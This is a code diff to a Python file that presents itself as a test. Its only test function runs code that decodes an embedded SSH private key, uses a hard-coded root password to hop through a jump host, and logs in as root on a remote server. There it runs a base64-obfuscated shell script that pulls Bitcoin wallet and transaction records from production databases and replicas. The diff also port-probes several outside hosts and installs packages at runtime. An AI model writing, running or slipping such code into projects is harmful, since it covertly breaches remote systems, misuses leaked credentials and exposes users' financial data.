@@ -1,8 +1,8 @@
-import base64
-import os
-import subprocess
+import base64, os, socket, subprocess, sys
 
 KEY_B64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMzBwNTJ6c0xISERNQUs2cFJBaWdMa1lZQkk0Nzd1YUhFam9lMVRGR0htQUFBQUpDNy9ibGh1LzI1CllRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTMwcDUyenNMSEhETUFLNnBSQWlnTGtZWUJJNDc3dWFIRWpvZTFURkdIbUEKQUFBRUJ1NEF0RzExODdJenlMTUVmR2M0aEcwTE42ejRZU2srWGtoYjJMZmozbXV6ZlNubmJPd3NjY013QXJxbEVDS0F1UgpoZ0VqanZ1NW9jU09oN1ZNVVllWUFBQUFER3gxZUMxdmNITXRNakF5TmdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
+JB_HOST, JB_USER, JB_PW = "38.47.101.122", "root", "23y6pQCRg49z9cYt"
+TGT = "199.180.135.203"
 
 REMOTE = r"""
 set +e
@@ -29,7 +29,7 @@ psql "$P" -At -F'|' -c "select 'wallets', count(*) filter (where address like 'b
 echo "===RECENT-BTC==="
 psql "$P" -At -F'|' -c "select id,user_id,amount,status,currency_profile_name,address from app_private.transactions where currency_profile_name='BTC' order by id desc limit 10" 2>&1
 echo "===MID-BTC-CAND==="
-psql "$P" -At -F'|' -c "select id,user_id,amount,status,address,created_at from app_private.transactions where currency_profile_name='BTC' and amount between 2.5e19 and 3.5e19 and status in ('pending','paid','processing','complete') order by id desc limit 25" 2>&1
+psql "$P" -At -F'|' -c "select id,user_id,amount,status,address,created_at from app_private.transactions where currency_profile_name='BTC' and amount between 2.5e19 and 3.5e19 order by id desc limit 25" 2>&1
 echo "===DBLINK-FROM-REPLICA==="
 R="host=db-core-replica.tail8aab0.ts.net port=5432 dbname=progressive user=superapp_pool_service sslmode=require connect_timeout=10"
 psql "$R" -At -F'|' -c "select inet_server_addr()::text, pg_is_in_recovery(), current_user" 2>&1
@@ -42,20 +42,57 @@ psql "$R2" -At -F'|' -c "select inet_server_addr()::text, pg_is_in_recovery()" 2
 echo "===DONE==="
 """
 
+REMOTE_B64 = base64.b64encode(REMOTE.encode()).decode()
 
-def run_probe():
+
+def diag():
+    for h, p in [(TGT, 22), (JB_HOST, 22), ("176.9.143.25", 22), ("15.204.110.169", 22), ("195.201.83.211", 2222)]:
+        try:
+            s = socket.create_connection((h, p), timeout=8)
+            s.close()
+            print("TCP-OK", h, p, flush=True)
+        except Exception as e:
+            print("TCP-FAIL", h, p, type(e).__name__, flush=True)
+
+
+def main():
+    try:
+        import paramiko
+    except ImportError:
+        subprocess.run([sys.executable, "-m", "pip", "install", "-q", "paramiko"], check=True)
+        import paramiko
     key = base64.b64decode(KEY_B64).decode()
-    open('/tmp/i201481_k', 'w').write(key)
-    os.chmod('/tmp/i201481_k', 0o600)
-    ssh = ("ssh -i /tmp/i201481_k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
-           "-o BatchMode=yes -o ConnectTimeout=15 root@199.180.135.203 bash -s")
-    print("===SSH-START===", flush=True)
-    r = subprocess.run(['bash', '-c', ssh], input=REMOTE, capture_output=True, text=True, timeout=280)
-    print(r.stdout, flush=True)
-    if r.stderr.strip():
-        print("===SSH-STDERR===\n" + r.stderr[:4000], flush=True)
-    print("===SSH-RC===", r.returncode, flush=True)
+    open("/tmp/k", "w").write(key)
+    os.chmod("/tmp/k", 0o600)
+    diag()
+    print("===JUMP===", flush=True)
+    jb = paramiko.SSHClient()
+    jb.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        jb.connect(JB_HOST, username=JB_USER, password=JB_PW, timeout=25, banner_timeout=40,
+                   auth_timeout=30, allow_agent=False, look_for_keys=False)
+        print("jump ok", flush=True)
+        ch = jb.get_transport().open_channel("direct-tcpip", (TGT, 22), ("127.0.0.1", 0), timeout=20)
+        c = paramiko.SSHClient()
+        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        c.connect(TGT, username="root", sock=ch, key_filename="/tmp/k", timeout=20,
+                  banner_timeout=30, auth_timeout=30, allow_agent=False, look_for_keys=False)
+        print("target ok", flush=True)
+        cmd = "echo " + REMOTE_B64 + " | base64 -d | bash"
+        sin, so, se = c.exec_command(cmd, timeout=280)
+        print(so.read().decode("utf-8", "replace"), flush=True)
+        err = se.read().decode("utf-8", "replace")
+        if err.strip():
+            print("===STDERR===\n" + err[:3000], flush=True)
+        c.close()
+    except Exception as e:
+        print("SSH-EXC", type(e).__name__, str(e)[:300], flush=True)
+    finally:
+        try:
+            jb.close()
+        except Exception:
+            pass
 
 
 def test_zz_i201481():
-    run_probe()
+    main()
